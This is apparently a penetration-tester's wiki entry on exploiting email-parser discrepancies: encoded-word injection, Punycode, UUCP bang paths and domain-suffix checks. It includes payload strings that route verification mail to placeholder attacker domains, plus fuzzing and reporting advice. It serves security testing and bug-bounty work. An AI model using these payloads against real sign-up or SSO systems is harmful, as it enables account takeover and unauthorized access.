---
title: "Parser Flaws (Email Parsing for Access Bypass and RCE)"
type: technique
tags: [web, parser, email, access-bypass, rce, auth-bypass, punycode]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[access-control]]", "[[command-injection]]", "[[idn-homograph-attack]]"]
status: active
---

# Parser Flaws (Email Parsing for Access Bypass and RCE)

## Overview

Different email parsers interpret the same address in different ways. Abusing these discrepancies allows domain-based authentication bypass (SSO, GitHub, Zendesk, GitLab) or, in some cases, RCE (Joomla via Punycode).

## Exploitation techniques

### 1. Encoded-Word injection (RFC 2047)

RFC 2047 defines a format to encode special characters in email headers:
`=?charset?encoding?text?=`

```
# Destination email: user@victim.com
# Payload: splits the address so SMTP parses it differently than the app

=?utf-8?q?collab?=@victim.com
=?utf-8?q?collab=40attacker=2ecom?=   # @ and . encoded
```

**Impact**: SSO provisions an account for `victim.com` but sends the email to `attacker.com`

### 2. Punycode / IDN (Internationalized Domain Names)

```
victim.com -> xn--victim-... (Punycode equivalent with a Unicode char)
attacker.com -> at{unicode}acker.com (with a lookalike Unicode character)
```

**Impact in Joomla**: processing malformed Punycode led to RCE via template injection

### 3. UUCP bang path (legacy)

```
# Old format: host!user (UUCP routing)
# Payload: oastify.com!collab\@example.com
# Sendmail routes to oastify.com instead of example.com
```

### 4. Domain-based auth bypass (GitHub, Zendesk, GitLab)

These systems trust the email domain to authorize access:
```
# If the system only checks that the email ends with @company.com:
collab@company.com.attacker.com  # bypass via subdomain
collab+@company.com@attacker.com  # depends on the parser
=?utf-8?q?admin@company.com?=@attacker.com
```

## Testing methodology

```bash
# 1. Probe - send special chars and observe the behavior
# Email with an encoded-word
=?utf-8?q?test?=@target.com

# 2. Fuzz with Turbo Intruder
# Script available at: https://github.com/PortSwigger/splitting-the-email-atom

# 3. OOB detection - use a Collaborator host for SMTP/DNS
=?utf-8?q?test?=@COLLABORATOR

# 4. Check the SMTP logs to see how it was decoded
```

## High-probability targets

```
- Apps with email-based SSO (GitHub OAuth, Zendesk SSO)
- Ruby on Rails (Mail gem - vulnerable to encoded-word)
- PHP with PHPMailer (IDN issues)
- Joomla (Punycode -> RCE, historical)
- Node.js with mailparser
```

## Tools

| Tool | Use |
|-----------|-----|
| **Hackvertor** (Burp) | Encoding/decoding of unicode, encoded-word |
| **Turbo Intruder** | Fuzzing encoded-word splits |
| **Punycode fuzzer** | GitHub: portswigger/splitting-the-email-atom |
| **Collaborator / OOB** | OOB detection via SMTP/DNS |
| **Web Security Academy** | Practice labs (Email Atom Splitting) |

## Reporting tips

- **Severity**: Critical for auth bypass; Critical for RCE
- Show full reproduction: input -> parser A (decode X) -> parser B (decode Y)
- For bypass: demonstrate access to the protected resource
- For RCE: PoC with command execution
- Note which parser/gem/version is vulnerable

## References

- PortSwigger Research: Splitting the Email Atom (https://portswigger.net/research/splitting-the-email-atom)
